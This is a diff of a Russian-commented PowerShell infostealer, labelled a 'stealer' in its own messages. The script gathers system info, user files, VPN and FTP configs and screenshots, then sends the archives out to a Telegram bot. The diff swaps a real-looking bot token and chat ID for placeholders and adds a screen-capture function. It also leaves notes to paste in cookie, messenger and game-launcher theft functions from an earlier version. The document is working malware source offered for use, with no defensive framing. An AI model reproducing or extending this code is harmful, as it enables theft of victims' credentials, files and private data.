@@ -15,14 +15,13 @@ $messages = @{
     FailSend = "Не получилось отправить архив.";
     Finished = "Стиллер завершён.";
 }
-$BotToken = "8432230669:AAGsKeVpDl9nKqUuHUfciRxrGYdIGQ01b6I"
-$ChatID = "1266539824"
+$BotToken = "<ВАШ_ТОКЕН>"
+$ChatID = "<ВАШ_CHAT_ID>"
 
 Add-Type -Assembly System.IO.Compression.FileSystem
 
 function WriteMsg($key) { Write-Host $messages[$key] }
 
-# Деление больших файлов
 function Split-File {
     param ([string]$FilePath, [int]$PartSizeMB = 49)
     $bufSize = 1MB
@@ -50,7 +49,6 @@ function Split-File {
     return $parts
 }
 
-# Отправка архива в Telegram
 function Send-ResultToTelegram {
     param (
         [string]$BotToken,
@@ -73,13 +71,11 @@ function Send-ResultToTelegram {
         $client = New-Object System.Net.Http.HttpClient
         $response = $client.PostAsync($url, $form).Result
         $statusCode = $response.StatusCode
-        $result = $response.Content.ReadAsStringAsync().Result
         $fileStream.Dispose(); $form.Dispose(); $client.Dispose()
         if ($statusCode -eq [System.Net.HttpStatusCode]::OK) { return $true } else { return $false }
     } catch { return $false }
 }
 
-# Сбор информации о системе (оптимизировано)
 function Get-SystemInfo {
     param($OutDirectory)
     New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
@@ -109,16 +105,6 @@ function Get-SystemInfo {
     } catch {}
 }
 
-Add-Type -AssemblyName System.Data
-
-# Сбор cookies (удалён для компактности — брать из оригинала/выше)
-function Get-ChromiumCookies { ... }
-function Get-FirefoxCookies { ... }
-function Get-AllChromiumCookies { ... }
-function Get-AllFirefoxCookies { ... }
-function Get-BrowserData { ... }
-
-# Сбор файлов
 function Gather-Files { 
     param($OutDirectory)
     New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
@@ -142,19 +128,11 @@ function Gather-Files {
     }
 }
 
-# Сбор игровых клиентов, мессенджеров, скриншот, пользовательской активности — брать из оригинала/выше
-function Get-GameLauncherData { ... }
-function Get-MessengerData { ... }
-function Take-Screenshot { ... }
-function Get-UserActivity { ... }
-
-# Оптимизированный сбор VPN/FTP — без зависаний!
 function Get-VpnFtpData {
     param($OutDirectory)
     New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
     $vpnDir = "$OutDirectory\VPN_Configs"
     New-Item -Path $vpnDir -ItemType Directory -Force | Out-Null
-
     $searchDirs = @(
         "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop",
         "$env:APPDATA\OpenVPN", "$env:APPDATA\OpenVPN Connect", "$env:APPDATA\ProtonVPN"
@@ -197,7 +175,20 @@ function Get-VpnFtpData {
     }
 }
 
-# Функция запуска со всеми параллельными задачами
+function Take-Screenshot {
+    param($OutFile)
+    Add-Type -AssemblyName System.Windows.Forms
+    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+    $bitmap = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height
+    $graphics = [Drawing.Graphics]::FromImage($bitmap)
+    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size)
+    $bitmap.Save($OutFile)
+    $graphics.Dispose()
+    $bitmap.Dispose()
+}
+
+# Здесь добавьте функции Get-BrowserData, Get-GameLauncherData, Get-MessengerData, Get-UserActivity из вашей версии!
+
 function Start-Execution {
     WriteMsg "Start"
     $tempDir = "$env:TEMP\SystemData-$(Get-Random)"
